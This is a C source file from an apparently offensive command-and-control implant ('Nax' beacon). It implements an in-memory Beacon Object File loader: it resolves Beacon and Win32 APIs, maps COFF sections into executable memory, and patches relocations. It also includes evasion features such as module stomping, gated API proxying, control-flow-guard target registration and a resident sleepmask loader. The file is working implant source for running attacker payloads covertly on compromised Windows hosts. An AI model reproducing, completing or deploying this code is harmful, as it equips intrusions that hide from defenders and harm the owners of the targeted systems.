/* beacon/src/Bof/Loader.c  [unity build - includes Api.c + Stomp.c]
 *
 * All three source files (Loader + Api + Stomp) are compiled as ONE translation
 * unit so that NaxBofInitApiTable's reference to BeaconOutput, BeaconDataParse
 * etc. are INTRA-unit.  Cross-unit references on MinGW PE targets produce
 * .refptr.* stubs that live outside .text; since we extract only .text for the
 * shellcode binary those stubs are unavailable at runtime and the addresses come
 * out as the link-time offsets (e.g. 0x43AA) instead of runtime addresses.
 * A single TU forces direct lea rip-relative addressing - no .refptr.* needed. */

#include "Nax.h"
#include "Common.h"
#include "Bof.h"

/* ---- pull in Api.c and Stomp.c as part of this translation unit ----
 * Define unity-build guard so their Macros.h/Instance.h guards are skipped
 * (they're already in scope from the includes above). */
#define _NAX_BOF_UNITY_BUILD_
#include "Api.c"
#include "Stomp.c"
#undef  _NAX_BOF_UNITY_BUILD_

/* ========= [ helpers ] ========= */

/* Get the symbol's name - handles both short (≤8 bytes embedded) and long (string table). */
static PCHAR SymName( PCOF_SYMBOL sym, PCHAR strtab ) {
    if ( sym->Name.Short == 0 )
        return strtab + sym->Name.Long;
    return sym->cName;
}

/* NaxHashStrMod: FNV1a-32 of 'len' bytes from str, lowercased, then ".dll" appended.
 * Used to match BOF Win32 symbol module names (e.g. "KERNEL32") against the PEB. */
static UINT32 NaxHashStrMod( const PCHAR str, UINT32 len ) {
    UINT32 h = 0x811C9DC5u;
    for ( UINT32 i = 0; i < len; i++ ) {
        BYTE c = (BYTE)str[i];
        if ( c >= 'A' && c <= 'Z' ) c += 0x20;
        h ^= c;
        h *= 0x01000193u;
    }
    CHAR dll[] = { '.', 'd', 'l', 'l', '\0' };
    for ( INT i = 0; dll[i]; i++ ) {
        h ^= (BYTE)dll[i];
        h *= 0x01000193u;
    }
    return h;
}

/* ========= [ Beacon API table ] ========= */

/* Macro forces separate runtime lea/mov per entry - never uses compound literal
 * struct init which the compiler may lay out in .data with link-time addresses. */
#define _API(i, h, fn) do { tbl[(i)].Hash = (h); tbl[(i)].Proc = (PVOID)(fn); } while(0)

static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
    _API(  0, H_BOF_BEACONDATAPARSE,      BeaconDataParse      );
    _API(  1, H_BOF_BEACONDATAINT,        BeaconDataInt        );
    _API(  2, H_BOF_BEACONDATASHORT,      BeaconDataShort      );
    _API(  3, H_BOF_BEACONDATALENGTH,     BeaconDataLength     );
    _API(  4, H_BOF_BEACONDATAEXTRACT,    BeaconDataExtract    );
    _API(  5, H_BOF_BEACONOUTPUT,         BeaconOutput         );
    _API(  6, H_BOF_BEACONPRINTF,         BeaconPrintf         );
    _API(  7, H_BOF_BEACONISADMIN,        BeaconIsAdmin        );
    _API(  8, H_BOF_BEACONFORMATALLOC,    BeaconFormatAlloc    );
    _API(  9, H_BOF_BEACONFORMATRESET,    BeaconFormatReset    );
    _API( 10, H_BOF_BEACONFORMATFREE,     BeaconFormatFree     );
    _API( 11, H_BOF_BEACONFORMATAPPEND,   BeaconFormatAppend   );
    _API( 12, H_BOF_BEACONFORMATPRINTF,   BeaconFormatPrintf   );
    _API( 13, H_BOF_BEACONFORMATTOSTRING, BeaconFormatToString );
    _API( 14, H_BOF_BEACONFORMATINT,      BeaconFormatInt      );
    _API( 15, H_BOF_BEACONDATAPTR,        BeaconDataPtr        );
    _API( 16, H_BOF_BEACONUSETOKEN,       BeaconUseToken       );
    _API( 17, H_BOF_BEACONREVERTTOKEN,    BeaconRevertToken    );
    _API( 18, H_BOF_BEACONGETSPAWNTO,     BeaconGetSpawnTo     );
    _API( 19, H_BOF_BEACONINFORMATION,    BeaconInformation    );
    _API( 20, H_BOF_TOWIDECHAR,           toWideChar           );
    _API( 21, H_BOF_AXADDSCREENSHOT,      AxAddScreenshot      );
    _API( 22, H_BOF_AXDOWNLOADMEMORY,     AxDownloadMemory     );
    /* Win32 proxy functions - bare LoadLibraryA/GetProcAddress/etc. from <windows.h>
     * generate __imp_LoadLibraryA COFF symbols with no MODULE$ prefix. */
    _API( 23, H_BOF_LOADLIBRARYA,         Nax->Kernel32.LoadLibraryA     );
    _API( 24, H_BOF_GETPROCADDRESS,       Nax->Kernel32.GetProcAddress   );
    _API( 25, H_BOF_GETMODULEHANDLEA,     Nax->Kernel32.GetModuleHandleA );
    _API( 26, H_BOF_FREELIBRARY,          Nax->Kernel32.FreeLibrary      );
    /* async BOF APIs */
    _API( 27, H_BOF_BEACONWAKEUP,          BeaconWakeup          );
    _API( 28, H_BOF_BEACONGETSTOPJOBEVENT,  BeaconGetStopJobEvent );
    /* KV store + heap redirect */
    _API( 29, H_BOF_BEACONADDVALUE,        BeaconAddValue        );
    _API( 30, H_BOF_BEACONGETVALUE,        BeaconGetValue        );
    _API( 31, H_BOF_BEACONREMOVEVALUE,     BeaconRemoveValue     );
    _API( 32, H_BOF_BEACONGETPROCESSHEAP,  BofGetProcessHeap     );
}
#undef _API

/* ========= [ BeaconGate BOF proxy ] ========= */

static PVOID NaxBofGateProxy( PNAX_INSTANCE Nax, PVOID proc ) {
    if ( !Nax->Gate || !proc ) return proc;
    for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ ) {
        if ( proc == Nax->GateSwaps.Entries[i].Original ) {
            PVOID gate = *Nax->GateSwaps.Entries[i].Slot;
            NaxDbg( Nax, "[bof] gate proxy: real=%p -> gate=%p", proc, gate );
            return gate;
        }
    }
    return proc;
}

/* ========= [ external symbol resolution ] ========= */

static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
                                    NAX_BOF_API* bofApiTable ) {
    /* ---- Beacon API lookup (no '$' separator) ---- */
    UINT32 sym_hash = NaxHashStr( sym_name );
    for ( INT i = 0; i < NAX_BOF_API_COUNT; i++ ) {
        if ( bofApiTable[i].Hash == sym_hash ) {
            NaxDbg( Nax, "[bof] sym '%s' -> BeaconAPI[%d] %p", sym_name, i, bofApiTable[i].Proc );
            return bofApiTable[i].Proc;
        }
    }

    /* ---- Win32 API: MODULE$FUNCTION ---- */
    UINT32 mod_len = 0;
    while ( sym_name[ mod_len ] && sym_name[ mod_len ] != '$' ) mod_len++;
    if ( sym_name[ mod_len ] != '$' ) {
        /* Bare Win32 symbol (no MODULE$ prefix) - try kernel32 via GetProcAddress.
         * Handles __imp_* symbols from <windows.h> declarations that aren't in the
         * beacon API table (e.g. HeapAlloc, VirtualAlloc, etc.). */
        PVOID proc = Nax->Kernel32.GetProcAddress( Nax->Kernel32.Handle, sym_name );
        proc = NaxBofGateProxy( Nax, proc );
        NaxDbg( Nax, "[bof] sym '%s' -> bare k32 fallback %p", sym_name, proc );
        return proc;
    }

    PCHAR  func_name = sym_name + mod_len + 1;
    UINT32 mod_hash  = NaxHashStrMod( sym_name, mod_len );

    PVOID hMod = NaxGetModule( mod_hash );
    if ( !hMod ) {
        /* Build lowercase CHAR module name for LoadLibraryA */
        CHAR mod_buf[64];
        UINT32 i;
        for ( i = 0; i < mod_len && i < 59; i++ ) {
            CHAR c = sym_name[i];
            if ( c >= 'A' && c <= 'Z' ) c += 0x20;
            mod_buf[i] = c;
        }
        mod_buf[i++] = '.'; mod_buf[i++] = 'd';
        mod_buf[i++] = 'l'; mod_buf[i++] = 'l';
        mod_buf[i]   = '\0';
        NaxDbg( Nax, "[bof] sym '%s' -> LoadLibraryA('%s')", sym_name, mod_buf );
        hMod = Nax->Kernel32.LoadLibraryA( mod_buf );
    }
    if ( !hMod ) {
        NaxDbg( Nax, "[bof] sym '%s' -> module NOT FOUND", sym_name );
        return NULL;
    }

    /* GetProcAddress handles forwarded exports (e.g. ole32!CreateStreamOnHGlobal →
     * combase) that NaxGetProc misses when the target module isn't pre-loaded.
     * BOF symbol names are available as strings so no hash lookup is needed. */
    PVOID proc = Nax->Kernel32.GetProcAddress( hMod, func_name );
    proc = NaxBofGateProxy( Nax, proc );
    NaxDbg( Nax, "[bof] sym '%s' -> %p (mod=%p)", sym_name, proc, hMod );
    return proc;
}

/* ========= [ section allocation ] ========= */

/* NON-STOMP: MEM_TOP_DOWN places all sections near the DLLs at 0x7FF9... so
 * that REL32 displacements stay within ±2 GB.  STOMP: NaxBofStompAlloc uses
 * StompAllocNear to place non-.text sections + mapFunctions adjacent to the
 * DLL image (also within ±2 GB).
 * image_base = MINIMUM section address so all ADDR32NB RVAs are non-negative. */
#define BOF_ALLOC_FLAGS (MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN)

/* Allocate mapFunctions AFTER sections so all allocations land in the same
 * memory region.  Allocating it first (with MEM_TOP_DOWN) places it at
 * 0x7FF8... while sections land at 0x1ECEC... - 6TB apart, 32-bit REL32
 * overflows.  Allocating last keeps everything within ~400KB of each other. */
static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
                                 PCOF_HEADER hdr, PCOF_SECTION sections,
                                 PVOID* mapSections, PVOID* mf_out,
                                 BOOL* stomped ) {
    NaxDbg( Nax, "[bof] alloc: NtAllocVMem=%p", Nax->Ntdll.NtAllocateVirtualMemory );

    if ( NaxBofStompAlloc( Nax, bof, hdr, sections, mapSections, mf_out ) ) {
        *stomped = TRUE;
        NaxDbg( Nax, "[bof] stomp mapFunctions=%p", *mf_out );
        return NAX_OK;
    }
    *stomped = FALSE;

    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        PCOF_SECTION s = sections + i;

        /* Use VirtualSize for sections with no raw data (.bss = zero-init globals).
         * Without this, .bss is NULL and BOF globals that should be 0 at entry
         * are at garbage/NULL addresses → corrupted counters, crashes. */
        UINT32 raw_size  = s->SizeOfRawData;
        UINT32 virt_size = s->VirtualSize;
        UINT32 need      = ( raw_size > 0 ) ? raw_size : virt_size;

        if ( need == 0 ) {
            mapSections[i] = NULL;
            NaxDbg( Nax, "[bof] sec[%d] '%.8s' skip (raw=%u virt=%u)",
                    (INT)i, s->Name, raw_size, virt_size );
            continue;
        }

        PVOID  base  = NULL;
        SIZE_T alloc = (SIZE_T)need + 16;
        NTSTATUS st  = Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &base, 0, &alloc, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );

        NaxDbg( Nax, "[bof] sec[%d] '%.8s' alloc raw=%u virt=%u -> %p (st=0x%x)",
                (INT)i, s->Name, raw_size, virt_size, base, (UINT32)st );

        if ( !NT_SUCCESS( st ) ) {
            for ( UINT16 j = 0; j < i; j++ ) {
                if ( mapSections[j] ) {
                    SIZE_T sz = 0; PVOID b = mapSections[j];
                    Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &sz, MEM_RELEASE );
                    mapSections[j] = NULL;
                }
            }
            return NAX_ERR_FAIL;
        }

        mapSections[i] = base;

        /* Copy raw bytes for ALL sections that have them, including writable (.data).
         * NtAllocateVirtualMemory zero-initialises; for .bss-style sections
         * (raw=0, virt>0) there is nothing to copy and they stay zeroed.
         * Do NOT skip writable sections: initialized globals belong in .data and
         * zeroing them corrupts the BOF's startup state. */
        if ( s->PointerToRawData && raw_size )
            MmCopy( base, bof + s->PointerToRawData, raw_size );
    }

    /* Allocate mapFunctions AFTER all sections so it lands in the same
     * memory region (within ~400 KB of .text, safe for 32-bit REL32). */
    PVOID  mf  = NULL;
    SIZE_T mfs = 4096;
    Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &mf, 0, &mfs, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );
    if ( mf ) MmZero( mf, mfs );
    *mf_out = mf;
    NaxDbg( Nax, "[bof] mapFunctions=%p (dist from .text: 0x%llx)",
            mf, mf ? (unsigned long long)((ULONG_PTR)mf - (ULONG_PTR)mapSections[0]) : 0 );
    return NAX_OK;
}

/* ========= [ cleanup ] ========= */

static VOID NaxBofCleanupSections( PNAX_INSTANCE Nax, PVOID* mapSections,
                                   UINT16 numSections, BOOL stomped ) {
    if ( stomped ) {
        NaxBofStompFree( Nax, mapSections, numSections );
        return;
    }
    for ( UINT16 i = 0; i < numSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( mapSections[i] ) {
            PVOID  base = mapSections[i];
            SIZE_T sz   = 0;
            Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &base, &sz, MEM_RELEASE );
            mapSections[i] = NULL;
        }
    }
}

/* ========= [ relocation processing ] ========= */

/* mapFunctions: MEM_TOP_DOWN buffer for external-symbol IAT slots.
 * External REL32 calls (FF 15, __imp__*) patch the displacement to point here.
 * *mf_idx tracks the next free 8-byte slot. */
static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                                     PCOF_HEADER hdr, PCOF_SECTION sections,
                                     PCOF_SYMBOL symtab, PCHAR strtab,
                                     PVOID* mapSections,
                                     NAX_BOF_API* bofApiTable,
                                     PUINT64 mapFunctions, UINT32* mf_idx,
                                     ULONG_PTR image_base ) {
    for ( UINT16 si = 0; si < hdr->NumberOfSections && si < BOF_MAX_SECTIONS; si++ ) {
        PCOF_SECTION s = sections + si;
        if ( !s->NumberOfRelocations || !s->PointerToRelocations ) continue;
        if ( !mapSections[si] ) continue;

        NaxDbg( Nax, "[bof] reloc sec[%d] '%.8s' %u relocs", (INT)si, s->Name, (UINT32)s->NumberOfRelocations );

        PCOF_RELOCATION relocs = (PCOF_RELOCATION)( bof + s->PointerToRelocations );

        for ( UINT16 ri = 0; ri < s->NumberOfRelocations; ri++ ) {
            PCOF_RELOCATION r    = relocs + ri;
            PCOF_SYMBOL     sym  = symtab + r->SymbolTableIndex;
            PBYTE           loc  = (PBYTE)mapSections[si] + r->VirtualAddress;

            PVOID sym_addr = NULL;

            if ( sym->SectionNumber > 0 ) {
                INT secIdx = sym->SectionNumber - 1;
                if ( secIdx >= BOF_MAX_SECTIONS || !mapSections[secIdx] ) continue;
                sym_addr = (PVOID)( (ULONG_PTR)mapSections[secIdx] + sym->Value );
            } else {
                PCHAR name = SymName( sym, strtab );

                /* Skip __imp_ prefix (6 bytes) */
                if ( name[0] == '_' && name[1] == '_' &&
                     name[2] == 'i' && name[3] == 'm' &&
                     name[4] == 'p' && name[5] == '_' )
                    name += 6;

                sym_addr = NaxBofResolveExternal( Nax, name, bofApiTable );
                if ( !sym_addr ) {
                    UINT32 nlen = NaxStrLen( name );
                    NaxDbg( Nax, "[bof] UNRESOLVED symbol: '%s'", name );
                    BeaconOutput( CALLBACK_ERROR, name, (INT)nlen );
                    return NAX_ERR_FAIL;
                }
            }

            /* Apply relocation patch */
            switch ( r->Type ) {
#if defined(__x86_64__) || defined(_WIN64)
            case IMAGE_REL_AMD64_ADDR64:
                *((UINT64*)loc) += (UINT64)(ULONG_PTR)sym_addr;
                break;
            case IMAGE_REL_AMD64_ADDR32NB: {
                /* RVA relative to image_base (the lowest allocated section address).
                 * Using the minimum address ensures all RVAs are non-negative UINT32.
                 * With MEM_TOP_DOWN, .text is at the HIGHEST address; using mapSections[0]
                 * instead would produce negative values for all sections below .text,
                 * which corrupts .pdata RUNTIME_FUNCTION UnwindInfoAddress entries and
                 * makes exception dispatch crash rather than unwind correctly. */
                INT32 cur;
                MmCopy( &cur, loc, 4 );
                cur += (INT32)( (ULONG_PTR)sym_addr - image_base );
                MmCopy( loc, &cur, 4 );
                break;
            }
            case IMAGE_REL_AMD64_REL32:
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5: {
                UINT32 delta  = r->Type - IMAGE_REL_AMD64_REL32;
                INT32  addend = 0;
                /* COFF spec: the 4 bytes at the relocation site are a signed addend.
                 * Both COFFLoader and Kharon include it in the displacement formula.
                 * Omitting it produces wrong addresses for any non-zero addend
                 * (e.g. RIP-relative access to the middle of a static array). */
                MmCopy( &addend, loc, 4 );

                PVOID target;

                if ( sym->SectionNumber > 0 || !mapFunctions ) {
                    target = sym_addr;
                } else {
                    /* External symbol via __imp_* (DECLSPEC_IMPORT, FF15 indirect call).
                     * Store the 64-bit function VA in the next mapFunctions slot.
                     * The disp32 points to that slot - one extra indirection, but the
                     * slot is in the same TOP_DOWN range so the ±2 GB limit is safe. */
                    if ( *mf_idx < 512 ) {
                        mapFunctions[ *mf_idx ] = (UINT64)(ULONG_PTR)sym_addr;
                        target = (PVOID)( mapFunctions + *mf_idx );
                        (*mf_idx)++;
                    } else {
                        target = sym_addr;
                    }
                }

                *((UINT32*)loc) = (UINT32)( addend + (ULONG_PTR)target
                                            - (ULONG_PTR)( loc + 4 + delta ) );
                break;
            }
#else
            case IMAGE_REL_I386_DIR32:
                *((UINT32*)loc) += (UINT32)(ULONG_PTR)sym_addr;
                break;
            case IMAGE_REL_I386_REL32:
                *((UINT32*)loc) += (UINT32)( (ULONG_PTR)sym_addr - (ULONG_PTR)( loc + 4 ) );
                break;
#endif
            default:
                NaxDbg( Nax, "[bof] unknown reloc type 0x%x in sec[%d]", (UINT32)r->Type, (INT)si );
                break;
            }
        }
    }
    return NAX_OK;
}

/* ========= [ entry point search ] ========= */

static PVOID NaxBofFindEntry( PNAX_INSTANCE Nax, PCOF_HEADER hdr, PCOF_SYMBOL symtab,
                              PCHAR strtab, PVOID* mapSections ) {
    for ( UINT32 i = 0; i < hdr->NumberOfSymbols; i++ ) {
        PCOF_SYMBOL sym = symtab + i;
        if ( sym->SectionNumber <= 0 ) {
            i += sym->NumberOfAuxSymbols;
            continue;
        }
        PCHAR name = SymName( sym, strtab );

        BOOL match = ( name[0] == 'g' && name[1] == 'o' && name[2] == '\0' );
#if !defined(__x86_64__) && !defined(_WIN64)
        if ( !match )
            match = ( name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == '\0' );
#endif
        if ( match ) {
            INT secIdx = sym->SectionNumber - 1;
            if ( secIdx < BOF_MAX_SECTIONS && mapSections[secIdx] ) {
                PVOID entry = (PVOID)( (ULONG_PTR)mapSections[secIdx] + sym->Value );
                NaxDbg( Nax, "[bof] entry 'go' found: sec[%d]+0x%x = %p", secIdx, (UINT32)sym->Value, entry );
                return entry;
            }
        }
        i += sym->NumberOfAuxSymbols;
    }
    NaxDbg( Nax, "[bof] entry 'go' NOT FOUND in %u symbols", (UINT32)hdr->NumberOfSymbols );
    return NULL;
}

/* ========= [ shared COFF preparation ] ========= */

typedef struct {
    PCOF_HEADER       Hdr;
    PCOF_SECTION      Sections;
    PCOF_SYMBOL       Symtab;
    PCHAR             Strtab;
    PVOID             MapSections[ BOF_MAX_SECTIONS ];
    PVOID             MfBase;
    BOOL              Stomped;
    ULONG_PTR         ImageBase;
    PRUNTIME_FUNCTION PdataTable;
    DWORD             PdataCount;
    BOOL              PdataInDll;
} NAX_BOF_PREP;

static INT NaxBofPrepare( PNAX_INSTANCE Nax, PBYTE bof, UINT32 bof_size, NAX_BOF_PREP* p ) {
    if ( bof_size < sizeof( COF_HEADER ) ) return NAX_ERR_WIRE;

    p->Hdr      = (PCOF_HEADER)bof;
    p->Sections = (PCOF_SECTION)( bof + sizeof( COF_HEADER ) );
    p->Symtab   = (PCOF_SYMBOL)( bof + p->Hdr->PointerToSymbolTable );
    p->Strtab   = (PCHAR)( p->Symtab + p->Hdr->NumberOfSymbols );

    if ( p->Hdr->Machine != COF_MACHINE_AMD64 ) return NAX_ERR_INVAL;

    NAX_BOF_API bofApiTable[ NAX_BOF_API_COUNT ];
    NaxBofInitApiTable( bofApiTable, Nax );

    MmZero( p->MapSections, sizeof( p->MapSections ) );
    p->MfBase     = NULL;
    p->Stomped    = FALSE;
    p->PdataTable = NULL;
    p->PdataCount = 0;
    p->PdataInDll = FALSE;

    UINT32 mf_idx = 0;

    if ( NaxBofAllocSections( Nax, bof, p->Hdr, p->Sections, p->MapSections, &p->MfBase, &p->Stomped ) != NAX_OK )
        return NAX_ERR_FAIL;

    p->ImageBase = (ULONG_PTR)~0ULL;
    for ( UINT16 i = 0; i < p->Hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( p->MapSections[i] && (ULONG_PTR)p->MapSections[i] < p->ImageBase )
            p->ImageBase = (ULONG_PTR)p->MapSections[i];
    }
    if ( p->MfBase && (ULONG_PTR)p->MfBase < p->ImageBase )
        p->ImageBase = (ULONG_PTR)p->MfBase;

    if ( NaxBofProcessRelocations( Nax, bof, p->Hdr, p->Sections, p->Symtab, p->Strtab, p->MapSections, bofApiTable, (PUINT64)p->MfBase, &mf_idx, p->ImageBase ) != NAX_OK ) {
        NaxBofCleanupSections( Nax, p->MapSections, p->Hdr->NumberOfSections, p->Stomped );
        if ( p->MfBase ) { SIZE_T z = 0; PVOID b = p->MfBase; Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &z, MEM_RELEASE ); }
        return NAX_ERR_FAIL;
    }

    if ( p->Stomped ) {
        for ( UINT16 pi = 0; pi < p->Hdr->NumberOfSections && pi < BOF_MAX_SECTIONS; pi++ ) {
            PCOF_SECTION ps = p->Sections + pi;
            if ( ps->Name[0] == '.' && ps->Name[1] == 'p' && ps->Name[2] == 'd' &&
                 ps->Name[3] == 'a' && ps->Name[4] == 't' && ps->Name[5] == 'a' &&
                 p->MapSections[pi] && ps->SizeOfRawData >= 12 ) {
                p->PdataTable = (PRUNTIME_FUNCTION)p->MapSections[pi];
                p->PdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );
                PVOID xdataBase = NULL;
                ULONG xdataSize = 0;
                ULONG_PTR firstUnwindVA = p->ImageBase + p->PdataTable[0].UnwindData;
                for ( UINT16 xi = 0; xi < p->Hdr->NumberOfSections && xi < BOF_MAX_SECTIONS; xi++ ) {
                    if ( !p->MapSections[xi] ) continue;
                    UINT32 secSz = p->Sections[xi].SizeOfRawData;
                    if ( secSz == 0 ) secSz = p->Sections[xi].VirtualSize;
                    if ( firstUnwindVA >= (ULONG_PTR)p->MapSections[xi] &&
                         firstUnwindVA <  (ULONG_PTR)p->MapSections[xi] + secSz ) {
                        xdataBase = p->MapSections[xi];
                        xdataSize = secSz;
                        break;
                    }
                }
                p->PdataInDll = NaxBofStompPdata( Nax, p->PdataTable, p->PdataCount, p->ImageBase, xdataBase, xdataSize );
                if ( !p->PdataInDll )
                    Nax->Ntdll.RtlAddFunctionTable( p->PdataTable, p->PdataCount, (DWORD64)p->ImageBase );
                break;
            }
        }
        NaxBofStompProtect( Nax, p->MapSections, p->Hdr->NumberOfSections, p->Sections );
    } else {
        for ( UINT16 i = 0; i < p->Hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
            if ( !p->MapSections[i] ) continue;
            PVOID  base = p->MapSections[i];
            SIZE_T sz   = (SIZE_T)( p->Sections[i].SizeOfRawData + 16 );
            ULONG  old  = 0;
            Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old );
        }
    }

    return NAX_OK;
}

static VOID NaxBofPrepCleanup( PNAX_INSTANCE Nax, NAX_BOF_PREP* p ) {
    if ( p->PdataTable && !p->PdataInDll )
        Nax->Ntdll.RtlDeleteFunctionTable( p->PdataTable );
    NaxBofCleanupSections( Nax, p->MapSections, p->Hdr->NumberOfSections, p->Stomped );
    if ( p->MfBase ) {
        SIZE_T z = 0; PVOID b = p->MfBase;
        Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &z, MEM_RELEASE );
    }
}

/* ========= [ public entry point ] ========= */

FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
                        PBYTE bof, UINT32 bof_size,
                        PBYTE user_args, UINT32 user_args_size ) {

    NAX_BOF_PREP prep;
    INT rc = NaxBofPrepare( Nax, bof, bof_size, &prep );
    if ( rc != NAX_OK ) return rc;

    PVOID entry = NaxBofFindEntry( Nax, prep.Hdr, prep.Symtab, prep.Strtab, prep.MapSections );
    if ( !entry ) {
        NaxBofPrepCleanup( Nax, &prep );
        BeaconOutput( CALLBACK_ERROR, "go", 2 );
        return NAX_ERR_FAIL;
    }

    NAX_JOB* curJob = NaxFindCurrentJob( Nax );
    NAX_BOF_CTX* stompCtx = curJob ? &curJob->BofCtx : &Nax->BofCtx;
    stompCtx->Stomped   = prep.Stomped ? 0x01 : 0x00;
    stompCtx->StompSlot = prep.Stomped ? ( curJob ? curJob->StompSlotIdx : 0xFF ) : 0x00;

    if ( prep.Stomped && Nax->CfgEnabled ) {
        BOF_STOMP_SLOT* cfgSlot = NULL;
        if ( Nax->BofStompPool.SmStompReq )
            cfgSlot = &Nax->BofStompPool.SmSlot;
        else if ( curJob == NULL )
            cfgSlot = &Nax->BofStompPool.SyncSlot;
        else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
            cfgSlot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];
        if ( cfgSlot )
            NaxCfgAddTarget( Nax, cfgSlot->DllBase, entry );
    }

    void ( *go )( char*, unsigned long ) = (void(*)( char*, unsigned long ))entry;
    go( (char*)user_args, (unsigned long)user_args_size );

    NaxBofPrepCleanup( Nax, &prep );
    return NAX_OK;
}

/* ========= [ resident BOF: load + keep alive ] ========= */

/* Find a named symbol (e.g. "sleep_mask") instead of hardcoded "go". */
static PVOID NaxBofFindSymbol( PNAX_INSTANCE Nax, PCOF_HEADER hdr, PCOF_SYMBOL symtab,
                               PCHAR strtab, PVOID* mapSections, PCHAR target ) {
    UINT32 tlen = NaxStrLen( target );
    for ( UINT32 i = 0; i < hdr->NumberOfSymbols; i++ ) {
        PCOF_SYMBOL sym = symtab + i;
        if ( sym->SectionNumber <= 0 ) {
            i += sym->NumberOfAuxSymbols;
            continue;
        }
        PCHAR name = SymName( sym, strtab );
        BOOL match = TRUE;
        for ( UINT32 k = 0; k <= tlen; k++ ) {
            if ( name[k] != target[k] ) { match = FALSE; break; }
        }
        if ( match ) {
            INT secIdx = sym->SectionNumber - 1;
            if ( secIdx < BOF_MAX_SECTIONS && mapSections[secIdx] ) {
                PVOID entry = (PVOID)( (ULONG_PTR)mapSections[secIdx] + sym->Value );
                NaxDbg( Nax, "[bof] symbol '%s' found: sec[%d]+0x%x = %p", target, secIdx, (UINT32)sym->Value, entry );
                return entry;
            }
        }
        i += sym->NumberOfAuxSymbols;
    }
    NaxDbg( Nax, "[bof] symbol '%s' NOT FOUND", target );
    return NULL;
}

FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
                               PBYTE bof, UINT32 bof_size,
                               PCHAR sym_name ) {
    NaxBofFreeResident( Nax );

    Nax->BofStompPool.SmStompReq = TRUE;

    NAX_BOF_PREP prep;
    INT rc = NaxBofPrepare( Nax, bof, bof_size, &prep );
    if ( rc != NAX_OK ) {
        Nax->BofStompPool.SmStompReq = FALSE;
        return NULL;
    }

    PVOID entry = NaxBofFindSymbol( Nax, prep.Hdr, prep.Symtab, prep.Strtab, prep.MapSections, sym_name );
    if ( !entry ) {
        NaxBofPrepCleanup( Nax, &prep );
        Nax->BofStompPool.SmStompReq = FALSE;
        return NULL;
    }

    Nax->BofStompPool.SmStompReq = FALSE;

    for ( UINT16 i = 0; i < prep.Hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ )
        Nax->ResidentSections[i] = prep.MapSections[i];
    Nax->ResidentNumSections = prep.Hdr->NumberOfSections;
    Nax->ResidentMapFunc     = prep.MfBase;
    Nax->ResidentStomped     = prep.Stomped;
    Nax->ResidentPdata       = prep.PdataTable;
    Nax->ResidentPdataCount  = prep.PdataCount;
    Nax->ResidentPdataInDll  = prep.PdataInDll;

    NaxDbg( Nax, "[bof-resident] loaded '%s' at %p (stomped=%d)", sym_name, entry, (INT)prep.Stomped );
    return entry;
}

FUNC VOID NaxBofFreeResident( PNAX_INSTANCE Nax ) {
    if ( !Nax->ResidentNumSections )
        return;

    NaxDbg( Nax, "[bof-resident] freeing" );

    /* Un-gate APIs BEFORE cleanup - NaxBofStompFree calls VirtualProtect
       on the SmSlot .text where the sleepmask code lives.  If VP is gated
       the sleepmask would VirtualProtect its own page to RW, removing
       execute permission, then DEP-crash on the next instruction.
       NaxSleepmaskWire re-gates them when a new BOF is loaded. */
    NaxGateUnwireAll( Nax );

    /* Route cleanup to SmSlot if the resident was stomped there */
    Nax->BofStompPool.SmStompReq = TRUE;

    if ( Nax->ResidentPdata && !Nax->ResidentPdataInDll )
        Nax->Ntdll.RtlDeleteFunctionTable( Nax->ResidentPdata );

    NaxBofCleanupSections( Nax, Nax->ResidentSections,
                           Nax->ResidentNumSections, Nax->ResidentStomped );

    if ( Nax->ResidentMapFunc ) {
        SIZE_T z = 0; PVOID b = Nax->ResidentMapFunc;
        Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &z, MEM_RELEASE );
    }

    Nax->BofStompPool.SmStompReq = FALSE;

    MmZero( Nax->ResidentSections, sizeof( Nax->ResidentSections ) );
    Nax->ResidentNumSections = 0;
    Nax->ResidentMapFunc     = NULL;
    Nax->ResidentStomped     = FALSE;
    Nax->ResidentPdata       = NULL;
    Nax->ResidentPdataCount  = 0;
    Nax->ResidentPdataInDll  = FALSE;
}
